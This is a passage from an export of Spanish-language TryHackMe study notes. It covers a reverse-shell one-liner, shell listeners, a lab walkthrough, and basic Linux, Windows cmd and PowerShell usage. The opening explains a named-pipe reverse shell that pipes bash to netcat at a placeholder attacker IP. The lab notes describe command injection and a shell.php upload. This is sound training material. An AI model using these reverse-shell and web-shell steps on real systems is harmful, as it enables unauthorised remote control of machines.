pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ahí sin conflictos.\n- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.\n- `cat /tmp/f`: Lee la información de la pipe (espera input).\n- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegurándose de que cualquier error se manda de vuelta al atacante.\n- `| nc IP_ATACANTE PUERTO ATACANTE`: Pipea el output de la shell hacia el atacante por medio de `nc` con la IP y el puerto.\n- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicación bidireccional.\n\n>[!IMPORTANT] Esto es una \"named pipe\", no una pipe normal. Una normal no permite comunicación bidireccional con la misma.\n\n----------------------------\n<h4>El Atacante Recibe la Shell</h4>\nUna vez que el payload es ejecutado, el atacante verá una reverse shell en su Netcat, permitiéndole ejecutar comandos en el sistema remoto.\n\n```shell\nattacker@kali:~$ nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964\nTo run a command as administrator (user \"root\"), use \"sudo \".\nSee \"man sudo_root\" for details.\n\ntarget@tryhackme:~$\n```\n\n"
  },
  {
    "title": "5. Shell Listeners",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/5-shell-listeners/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/5. Shell Listeners.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Hasta ahora hemos estado usando Netcat para escuchar todas nuestras conexiones, pero hay más. Exploremos algunas de las herramientas de escucha de conexiones.\n\n-----------------------\n<h2>Rlwrap</h2>\nEs una pequeña utilidad que usa la librería readline de GNU para ofrecernos modificar el teclado e historial. A continuación una muestra de un netcat mejorado con rlwrap:\n\n```shell\nattacker@kali:~$ rlwrap nc -lvnp 443\nlistening on [any] 443 ...\n```\n\nEnvuelve `nc` con `rlwrap`, permitiendo el uso de funcionalidades como el uso de flechas e historial para una mejor interacción.\n\n-------------------\n<h2>Ncat</h2>\nNcat es una versión mejorada de Netcat distribuida por el proyecto NMAP. Ofrece funcionalidades extra, como encriptación SSL. A continuación unos ejemplos escuchando reverse shells sin y con encriptación SSL, respectivamente:\n\n```shell\nattacker@kali:~$ ncat -lvnp 4444\nNcat: Version 7.94SVN ( https://nmap.org/ncat )\nNcat: Listening on [::]:443\nNcat: Listening on 0.0.0.0:443\n```\n\n```shell\nattacker@kali:~$ ncat --ssl -lvnp 4444\nNcat: Version 7.94SVN ( https://nmap.org/ncat )\nNcat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\nNcat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F\nNcat: Listening on [::]:443\nNcat: Listening on 0.0.0.0:443\n```\n\nLa opción `--ssl` habilita la encriptación SSL para el listener.\n\n--------------------------\n<h2>Socat</h2>\nEs una utilidad que permite crear una conexión socket entre dos fuentes de información, en este caso, dos hosts diferentes.\n\n```shell\nattacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT\n2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443\n```\n\nEl comando de arriba usa la opción `-d` para permitir el output verbose, usarlo más veces incrementa el verbose (`-d -d`). La opción `TCP-LISTEN:443` crea un listener TCP en el puerto 443. Finalmente la opción STDOUT dirije cualquier información entrante a la terminal."
  },
  {
    "title": "2. Shell Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/2-shell-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/2. Shell Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "<h2>¿Qué es una shell?</h2>\nUna shell es un software que permite al usuario interactuar con el sistema operativo. Puede ser una interfaz gráfica, pero normalmente es una interfaz de línea de comandos.\n\nEn ciberseguridad, se suele referir a una sesión shell específica que un atacante usa al acceder a un sistema comprometido, permitiéndole ejecutar comandos y software. Algunas de las cosas que un atacante puede hacer con una shell son:\n\n- **Control Remoto del Sistema:** Permite al atacante ejecutar comandos o software remotamente.\n- **Escalada de Privilegios:** Si el acceso inicial a través de una shell está limitado o restringido, los atacantes pueden explorar maneas de escalar privilegios.\n- **Exfiltración de Datos:** Una vez que los atacantes pueden ejecutar comandos, pueden explorar el sistema.\n- **Persistencia:** Una vez obtenido el acceso, los atacantes pueden dejar \"puertas abiertas\" en el sistema para volver a entrar más adelante de una manera más sencilla.\n- **Actividades de Post-Explotación:** Después de ganar acceso, los atacantes pueden realizar una amplia selección de actividades post-explotación, como desplegar malware, crear cuentas escondidas, borrar información, etc.\n- **Acceder a otros Sistemas en la Red:** Dependiendo de las intenciones del atacante, la shell de acceso puede ser sólo el inicio, si planea saltar a otros dispositivos de la red. También se conoce como pivotar.\n\n"
  },
  {
    "title": "8. Practical Task",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/8-practical-task/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/8. Practical Task.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Tenemos la siguiente información antes de empezar:\n\n- 10.10.111.78:8080 hosts the landing page\n- 10.10.111.78:8081 hosts the web application that is vulnerable to command injection.\n- 10.10.111.78:8082 hosts the web application that is vulnerable to an unrestricted file upload.\n\n----------------------\n1. Entramos a la página principal dada:\n   ![[Pasted image 20251017174947.png]]\n2. Reverse/Bind Shell nos lleva al puerto `8081`:\n   ![[Pasted image 20251017175056.png]]\n\t1. Abrimos un listener:\n\t   ![[Pasted image 20251017175323.png]]\n\t2. Metemos el oneliner de reverse shell en la página:\n\t   ![[Pasted image 20251017175351.png]]\n\t3. Obtenemos la conexión:\n\t   ![[Pasted image 20251017175431.png]]\n\t4. Encontramos la flag:\n\t   ![[Pasted image 20251017175637.png]]\n3. Web Shell nos lleva al puerto `8082`:\n   ![[Pasted image 20251017175722.png]]\n\t1. Creamos el archivo `shell.php`:\n\t   ![[Pasted image 20251017175838.png]]\n\t2. Lo subimos al servidor:\n\t   ![[Pasted image 20251017175912.png]]\n\t3. Miramos en el directorio /uploads:\n\t   ![[Pasted image 20251017180444.png]]\n\t4. Buscamos el archivo flag en el directorio correspondiente:\n\t   ![[Pasted image 20251017180526.png]]\n\t5. Leemos la flag:\n\t   ![[Pasted image 20251017180612.png]]"
  },
  {
    "title": "2. How to interact With a Shell?",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/2-how-to-interact-with-a-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/2. How to interact With a Shell?.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "La mayoría de distribuciones de Linux usan Bash (Bourne Again Shell).\n\nAl interactuar con la consola hay varios comandos que necesitamos conocer:\n\n- `pwd`: Print Working Directory, nos dice el directorio actual.\n- `cd`: Change Directory, nos permite cambiar de directorio.\n- `ls`: List, nos devuelve los archivos y directorios (no ocultos) del directorio actual o el especificado.\n- `cat`: Concatenate, encadena carácter a carácter los contenidos de un archivo y los devuelve por la salida estándar.\n- `grep`: Es una herramienta de filtrado de texto basado en patrones (soporta regex).\n"
  },
  {
    "title": "0. Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/0-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/0. Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "[[1. Introduction to Linux Shells]]\n[[2. How to interact With a Shell?]]\n[[3. Types of Linux Shells]]\n[[4. Shell Scripting and Components]]\n[[5. The Locker Script]]\n"
  },
  {
    "title": "3. Types of Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/3-types-of-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/3. Types of Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "Como la Command Prompt o la PowerShell en Windows, Linux tiene diferente consolas disponibles.\n\nPara ver nuestra consola actual podemos escribir `echo $SHELL`. El archivo `/etc/shells` contiene todas las consolas disponibles instaladas en nuestro sistema. Para listarlas: `cat /etc/shells`.\n\nSi quieres abrir una de las shells que se muestran, como por ejemplo `/usr/bin/zsh`, lo único que tienes que hacer es teclear su nombre en tu línea de comandos (`zsh`).\n\nSi quieres cambiar tu shell predeterminada a otra, puedes usar el comando: `chsh -s /usr/bin/zsh` (change shell).\n\nVamos a ver algunas de las shells más usadas:\n\n------------------\n<h2>Bourne Again Shell</h2>\nEs la consola por defecto de la mayoría de distros Linux. Antes de Bash existían diferentes consolas como sh, ksh y csh. Bash llegó para unir funcionalidades y mejorarlas. Estas son algunas de las habilidades únicas de Bash:\n\n- Capacidad de scripting.\n- Habilita la tabulación para el autocompletado de rutas y comandos.\n- Guarda un historial de todos los comandos usados. Puedes tanto usar las flechas de arriba y abajo o escribir `history` para verlos.\n\n-----------------\n<h2>Friendly Interactive Shell</h2>\nFISH no está por defecto en la mayoría de distribuciones. Como indica su nombre, se centra más en ser fácil para el usuario que otras consolas. Algunos de los puntos clave son:\n\n- Ofrece una sintaxis muy sencilla.\n- Tiene autocorrección de errores en los comandos que escribes.\n- Puedes personalizar la línea de comandos.\n- Tiene un resaltado de sintaxis muy interesante.\n- Ofrece scripting, autocompletado con tabulación e historial de comandos.\n\n-----------------\n<h2>Z Shell</h2>\nEsta tampoco esta instalada en la mayoría de distribuciones. Se considera una shell moderna que combina funcionalidades de algunas shells anteriores. Algunas de sus características son:\n\n- Autocompletado por tabulación avanzado y capacidad de scripting.\n- Autocorrección de comandos.\n- Ofrece personalización extendida (lo que puede hacerla más lenta que otras shells).\n- Ofrece historial de comandos y muchas otras funcionalidades."
  },
  {
    "title": "4. Shell Scripting and Components",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/4-shell-scripting-and-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/4. Shell Scripting and Components.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "Un script de Shell no es nada más que un conjunto de comandos. Supón una tarea repetitiva que requiere que introduzcas múltiples comandos usando una consola. En vez de meter uno a uno manualmente puedes escribir un documento que sirva como una lista de tareas para el ordenador.\n\nEl primer paso es abrir un editor de texto en la consola, puede ser nano, vi, vim, nvim, etc. Llamaremos al script `loquesea.sh`. El `.sh` realmente no es necesario, pero nos ayuda a la hora de identificar scripts.\n\nTodos los scripts pueden ejecutarse sin lo que se conoce como shebang o hashbang (`#!`). Sin embargo, es preferible ponerlo ya que nos facilitará la ejecución que cambiará de `/usr/bin/bash script.sh` (sin el hashbang) a `./script.sh` (con él). Este siempre se debe de poner en la primera línea del script, y dependiendo del lenguaje que utilicemos en el script y de dónde esté alojado en nuestro sistema será uno u otro.\n\nEn nuestro caso `vi first_script.sh` -> `#!/bin/bash`.\n\n------------\n<h2>Variables</h2>\nUna variable guarda contenido dentro de ella. Supongamos que usamos un valor complejo, como una URL. en vez de escribir esta muchas veces, podemos guardarla en una variable con un nombre sencillo y ponerla cuando lo necesitemos.\n\nEn el siguiente script veremos como se pregunta por el nombre, se guarda en una variable y por último se muestra por pantalla:\n\n```bash\n#!/bin/bash\n\necho \"Hey, what's your name?\"\nread name\necho \"Welcome, $name\"\n```\n\nPara ejecutar este script, tenemos que darle permisos. Esto lo podemos hacer con el comando `chmod +x <archivo>`. La notación es **r** para leer, **w** para escribir y **x** para ejecutar, **+** para dar y **-** para quitar. En su defecto podemos usar la notación octal si nos resulta más fácil.\n\nUna vez tiene permisos lo ejecutamos haciendo uso de `./` antes del ejecutable. Esto le dice a la shell que ejecute el archivo que está en este directorio.\n\n--------------------\n<h2>Bucles</h2>\nComo su propio nombre da a entender, es algo que se repite. Por ejemplo, tienes una lista de muchos amigos y quieres mandarles el mismo mensaje. En vez de mandar todos de manera individual, puedes hacer un bucle que repita el proceso de mandar el mensaje.\n\n```bash\n#!/bin/bash\n\nfor i in {1..10};do\n\techo $i\ndone\n```\n\nLa variable `i` es el iterador, puede tener el nombre que tu quieras. Este se ejecutara de 1 a 10. El `do` indica el comienzo del bucle y `done` el final. El comando `echo $i` imprimirá la variable `i` de cada iteración.\n\n--------------------\n<h2>Condicionales</h2>\nSon una parte especial del scripting, nos ayudan a ejecutar cierta parte del código sólo si una condición se cumple. Imagina que hay un secreto que sólo quieres que vea un usuario:\n\n```bash\n#!/bin/bash\n\necho \"Please enter your name first:\"\nread name\nif [ \"$name\" = \"Stewart\" ]; then\n        echo \"Welcome Stewart! Here is the secret: THM_Script\"\nelse\n        echo \"Sorry! You are not authorized to access the secret.\"\nfi\n```\n\nEl script de arriba te pide un nombre. Si introduces el correcto te da el secreto. Si no, te dice que no estás autorizado.\n\n--------------------\n<h2>Comentarios</h2>\nA veces el código puede ser muy complejo, o queremos que otros usuarios tengan facilidad para entenderlo, en este caso, podemos comentar el código para dar indicaciones, explicaciones o hacerlo más legible. \n\nPara comentar en bash podemos usar `#`. Los comentarios no afectan a la ejecución del código."
  },
  {
    "title": "1. Introduction to Linux Shells",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/1-introduction-to-linux-shells/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/1. Introduction to Linux Shells.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "Usar una CLI te da más opciones y poder sobre las decisiones que envuelven a tu sistema operativo.\n\n<h2>Objetivos de Aprendizaje</h2>\n- Aprender interacción con una consola Linux.\n- Usar comandos básicos de Shell.\n- Explorar los tipos de Shells de Linux disponibles.\n- Escribir algunos scripts.\n\n<h2>Pre-requisitos</h2>\n[[2. Linux Fundamentals]]\n"
  },
  {
    "title": "5. The Locker Script",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/3-linux-shells/5-the-locker-script/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/3. Linux Shells/5. The Locker Script.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 3. Linux Shells",
    "content": "En la tarea anterior hemos estudiado variables, bucles, condicionales y comentarios.\n\n--------------\n<h2>Requerimiento</h2>\nUn usuario tiene una taquilla en un banco. Para securizar la taquillas, tenemos que tener un script que verifique el usuario en primer lugar. Cuando el usuario introduzca su usuario, nombre de la compañía y PIn, debería dejarle acceder.\n\n```bash\n#!/bin/bash \n\n# Defining the variables\nusername=\"\"\ncompanyname=\"\"\npin=\"\"\n\n# Defining the loop\nfor i in {1..3}; do\n# Defining the conditional statements\n        if [ \"$i\" -eq 1 ]; then\n                echo \"Enter your Username:\"\n                read username\n        elif [ \"$i\" -eq 2 ]; then\n                echo \"Enter your Company name:\"\n                read companyname\n        else\n                echo \"Enter your PIN:\"\n                read pin\n        fi\ndone\n\n# Checking if the user entered the correct details\nif [ \"$username\" = \"John\" ] && [ \"$companyname\" = \"Tryhackme\" ] && [ \"$pin\" = \"7385\" ]; then\n        echo \"Authentication Successful. You can now access your locker, John.\"\nelse\n        echo \"Authentication Denied!!\"\nfi\n```"
  },
  {
    "title": "4. File and Disk Management",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/4-file-and-disk-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/4. File and Disk Management.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Hemos visto cómo obtener información básica del sistema. Ahora aprenderemos a movernos por los directorios y archivos.\n\n------------------\n<h2>Trabajando con directorios</h2>\nPodemos usar `cd` sin parámetros para mostrar el drive actual y el directorio actual. Podemos ver los directorios hijos usando `dir`. Con este último comando tenemos la opción de mostrar incluso aquellos ocultos (`dir /a`) o mostrar archivos en el directorio actual y todos los subdirectorios (`dir /s`).\n\nPara obtener una representación visual de directorios y archivos podemos usar `tree`.\n\nPara navegar a cualquier directorio podemos usar `cd <nombre_directorio>`. Para volver atrás podemos usar `cd ..`.\n\nPara crear un directorio usamos `mkdir` y para eliminar un directorio vacío `rmdir`.\n\n-------------------\n<h2>Trabajando con archivos</h2>\nPodemos ver fácilmente archivos de texto con el comando `type <archivo>`.\n\nEl comando `copy` nos permite copiar archivos de un sitio a otro.\n\nCon el comando `move` podemos moverlos de un sitio a otro.\n\nPara borrar un archivo podemos usar `del` o `erase`.\n\n>[!TIP] Podemos usar el asterisco para referirnos a todos los archivos, por ejemplo `copy *.md C:\\Markdown` para copiar todos los archivos con extensión .md a la carpeta Markdown.\n\n"
  },
  {
    "title": "0. Windows Command Line",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/0-windows-command-line/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/0. Windows Command Line.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/1. Introduction]]\n[[2. Basic System Information]]\n[[3. Network Troubleshooting]]\n[[4. File and Disk Management]]\n[[5. Task and Process Management]]\n[[6. Conclusion]]\n"
  },
  {
    "title": "2. Basic System Information",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/2-basic-system-information/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/2. Basic System Information.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Antes de introducir ningún comando debemos saber que sólo podemos usar comandos que se encuentren dentro del path. Para ver el path, podemos usar el comando `set`.\n\nPara ver la versión del sistema operativo, podemos usar el comando `ver`.\n\nPara descubrir más información sobre el sistema podemos usar el comando `systeminfo`.\n\nUn par de consejos:\n\n- Si el output es muy largo, podemos pipearlo por `more` (`drverquery | more`). Así podemos verlo página a página presionando el espacio.\n- `help` nos brinda información del comando que elijamos.\n- `cls` limpia la pantalla."
  },
  {
    "title": "6. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/6-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/6. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Intencionalmente hemos omitido algunos comandos durante esta lección porque no tenían mucho sentido en una lección para principiantes. De cualquier forma, aquí los comentamos:\n\n- `chkdsk`: Comprueba el sistema y los volúmenes de discos en busca de errores o sectores dañados.\n- `driverquery`: Muestra una lista de dispositivos instalados.\n- `sfc /scannow`: Escanea los archivos del sistema en busca de corrupciones y las repara si puede.\n\nEl comando `shutdown /s` sirve para apagar el sistema, si queremos reiniciarlo podríamos usar `shutdown /r`. Con `shutdown /a` podemos abortar un apagado del sistema."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Todo el mundo prefiere una interfaz gráfica (GUI) hasta que masteriza una interfaz de linea de comandos (CLI). Esto se puede deber a que es más intuitiva para la mayoría de usuarios.\n\nlas CLIs normalmente tiene una curva de aprendizaje, pero cuanto más las uses, más rápido te darás cuenta de que son más eficientes y rápidas. Por ejemplo, ¿cuántos clicks tienes que hacer para encontrar tu IP en una GUI? Con una CLI es un comando.\n\nHay muchas otras ventajas de usar una CLI:\n\n- Uso reducido de recursos: Requieren menos recursos por lo que pueden funcionar en equipos de hardware limitado o antiguo.\n- Automatización: Aunque puedes automatizar tareas en una GUI, crear un script de bash con los comandos que deseas repetir es mucho más sencillo.\n- Gestión remota: Una CLI hace muy sencillo el uso de SSH para manejar remotamente un sistema.\n\n--------------------------\n<h2>Objetivos de aprendizaje</h2>\nEl objetivo de esta unidad es enseñar a usar `cmd.exe`, el MS Windows Command Prompt.\n\n- Mostrar información básica.\n- Comprobar y arreglar errores de la configuración de red.\n- Controlar archivos y ficheros.\n- Comprobar los procesos corriendo.\n\n--------------------\n<h2>Pre-requisitos</h2>\nPara empezar esta lección es necesario haber completado [[3. Windows and AD Fundamentals]].\n\n-------------------\n<h2>Establecer una conexión SSH</h2>\nNos conectaremos a la máquina mediante SSH. Para poder hacerlo necesitaremos usar la VPN de la plataforma: `sudo openvpn <ruta_vpn>`. Después, desde la terminal, ejecutaremos el comando: `ssh <usuario>@<direccion_ip>.\n\nCredenciales:\n\n- Usuario: `user`\n- Contraseña: `Tryhackme123!`\n"
  },
  {
    "title": "3. Network Troubleshooting",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/3-network-troubleshooting/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/3. Network Troubleshooting.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "La mayoría de nosotros estamos acostumbrados a mirar la configuración de red de MS Windows desde la GUI. Sin embargo, la CLI nos da bastantes comandos para mirar la configuración, comprobar las conexiones en curso y reparar errores de red.\n\n------------------\n<h2>Configuración de Red</h2>\nPara comprobar nuestra configuración de red podemos usar el comando `ipconfig`. Si queremos más información todavía, podemos usar el comando `ipconfig /all`.\n\n-----------------------\n<h2>Resolución de problemas de Red</h2>\nUna resolución común es comprobar si el servidor puede acceder a un servidor particular en Internet. La sintaxis es la siguiente: `ping <nombre_servidor>`. Inspirado en el ping-pong, mandamos un paquete ICMP (ping) y esperamos por una respuesta (pong).\n\nOtra herramienta valiosa es `tracert` (trace route). El comando `tracert <nombre_servidor>` rastrea la ruta de red atravesada para llegar al objetivo.\n\n-----------------------\n<h2>Más comandos de Red</h2>\nOtro comando bueno de conocer es `nslookup`. Este nos permite buscar la dirección IP de un dominio (`nslookup <nombre_servidor>`).\n\nEl último comando que trataremos en esta unidad será `netstat`. Este comando muestra conexiones actuales y puertos en escucha. Para ver más opciones referentes a este comando podemos usar `netstat -h`. Algunas opciones comunes son:\n\n- `-a`: Muestra todas las conexiones establecidas y puertos en escucha.\n- `-b`: Muestra el comando asociado con cada puerto en escucha y conexión establecida.\n- `-o`: Muestra el PID asociado con la conexión.\n- `-n`: Usa una forma numérica para las direcciones y puertos.\n\nPodemos combinar estas opciones anteriores en `netstat -abon`. Esto nos deja claro que el ejecutable `sshd.exe` es el responsable de escuchar conexiones entrantes en el puerto 22. También nos permite ver el PID asociado a cada conexión."
  },
  {
    "title": "5. Task and Process Management",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/1-windows-command-line/5-task-and-process-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/1. Windows Command Line/5. Task and Process Management.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 1. Windows Command Line",
    "content": "Es probable que estés familiarizado con el gestor de tareas de MS Windows y con matar procesos que no responden.\n\nPara listar procesos usamos `tasklist`. Algo de filtrado es útil porque el output puede ser muy largo. Puedes ver todos los filtros disponibles con `tasklist /?`. Digamos que queremos ver las tareas relacionadas con `sshd.exe`, podemos hacerlo con `tasklist /FI \"imagename eq sshd.exe\"`. Esto hace filter image name equals sshd.exe.\n\nSabiendo el PID, podemos terminar cualquier proceso usando `taskkill /PID <PID>`."
  },
  {
    "title": "2. What is PowerShell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/2-what-is-powershell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/2. What is PowerShell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "PowerShell es una plataforma de automatización de tareas que consta de una linea de comandos, un lenguaje de scripting y un marco de control de configuración.\n\n-----------------------\n<h2>Una breve historia sobre PowerShell</h2>\nFue desarrollada para sobreponerse a las limitaciones de las herramientas de linea de comandos que había. A principios de los 2000, herramientas tradicionales como `cmd.exe` se quedaban cortas para la automatización y el manejo de los sistemas.\n\nJeffrey Snover, un ingeniero de Microsoft, se dio cuenta de que Windows y UNIX manejaban las operaciones del sistema de forma diferente. Windows usaba una estructura de datos y APIs mientras que UNIX trataba todo como archivos. Como esto hacía que migrar las herramientas de UNIX a Windows no fuera práctico, J. Snover desarrolló con orientación a objetos. Fue lanzada en 2006 y en 2016 con la creciente demanda de una herramienta de automatización, Windows lanzó PowerShell Core, de código abierto.\n\n-----------\n<h2>El poder en PowerShell</h2>Para poder entender el poder de PowerShell, necesitamos comprender qué es un objeto en este contexto.\n\nEn programación, un objeto representa un ítem con propiedades (características) y métodos (acciones). Por ejemplo, el objeto `coche` tendría propiedades `color`, `modelo`, `nivelDeGasolina` y métodos como `conducir()`, `tocarBocina()` o `repostar()`.\n\nDe forma similar, en PowerShell los objetos son unidades de información fundamentales que pueden contener nombres, usuarios, propiedades y métodos.\n\nEn la command shell tradicional, los comandos están basados en texto, significando que sus procesos nos dan información en texto plano. Por el contrario, cuando un cmdlet (comand-let) se ejecuta en PowerShell, devuelve un objeto que almacena información, lo que da pie a manipulación de la información más flexible y potente."
  },
  {
    "title": "3. PowerShell Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/2-windows-powershell/3-powershell-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/2. Windows PowerShell/3. PowerShell Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line > 2. Windows PowerShell",
    "content": "<h2>Ejecutando PowerShell</h2>\nPowerShell se puede ejecutar de diferentes maneras.\n\n- Menú de inicio: Escribe `powershell` y haz click en `Windows PowerShell` o `PowerShell`.\n- Run Dialog: Presiona `Win + R` para abrir el run dialog, escribe `powershell` y dale a `Enter`.\n- Explorador de archivos: Escribe `powershell`en la barra de direcciones. Esto abre PowerShell específicamente en ese directorio.\n- Gestor de tareas: Abre el task manager, ve a `File -> Run new task`, escribe `powershell` y presiona `Enter`.\n\nTambién puedes ejecutarlo desde la cmd escribiendo `powershell`.\n\n------------------\n<h2>Sintaxis Básica: Verbo-Nombre</h2>\nComo ya hemos hablado, los comandos de la PowerShell se llaman `cmdlets` (`command-lets`). Son mucho más poderosos que los comandos de Windows tradicionales.\n\nEstos siguen una norma de nomenclatura consistente `verbo-nombre`. Esto hace fácil entender lo que hace cada uno. el verbo describe la acción y el nombre especifica el objeto sobre el que se aplica la acción. Por ejemplo:\n\n- `Get-Content`: Devuelve el contenido de un archivo.\n- `Set-Location`: Cambia el directorio actual de trabajo.\n\n-----------------\n<h2>Cmdlets Básicos</h2>\nPara ver la mayoría de los cmdlets que podemos usar, hay un comando: `Get-Command`.\n\nPara cada objeto `CommandInfo` devuelto por el cmdlet, algunas propiedades se muestran en pantalla. Es posible filtrar, por ejemplo, si queremos ver sólo los cmdlets de tipo función:\n`Get-Command -CommandType \"Function\"`.\n\nOtro cmdlet importante de saber es: `Get-Help`. Devuelve información detallada sobre cmdlets: `Get-Help Get-Date`. Si añadimos `-examples` nos devolverá una lista de ejemplos comunes.\n\nPara hacer más sencillo el cambio para profesionales de IT hacia PowerShell, este cuenta con una lista de aliases, que son comandos que llevan hacia otros cmdlets, por ejemplo `cat -> Get-Content`. Si escribimos cat en la terminal, tendrá el mismo efecto que escribir Get-Content, que es el cmdlet correcto para la acción que normalmente suele hacer cat. `Get-Alias` lista todos los aliases disponibles.\n\n---------------\n<h2>Dónde Encontrar y Descargar cmdlets</h2>\nOtra poderosa función de PowerShell es la posibilidad de extender sus funcionalidades descargando cmdlets adicionales de repositorios online.\n\n>[!NOTE] Los cmdlets que veremos ahora requieren conexión a Internet. Como la máquina a la que nos hemos conectado no tiene acceso a Internet, no podremos usarlos.\n\nPara buscar módulos podemos usar `Find-Module`. A veces, si no sabemos el nombre exacto nos podemos ayudar de `*`, por ejemplo para encontrarlo con mayor facilidad.\n\n```powershell\nPS C:\\Users\\captain> Find-Module -Name \"PowerShell*\"\n\nVersion    Name                                Repository           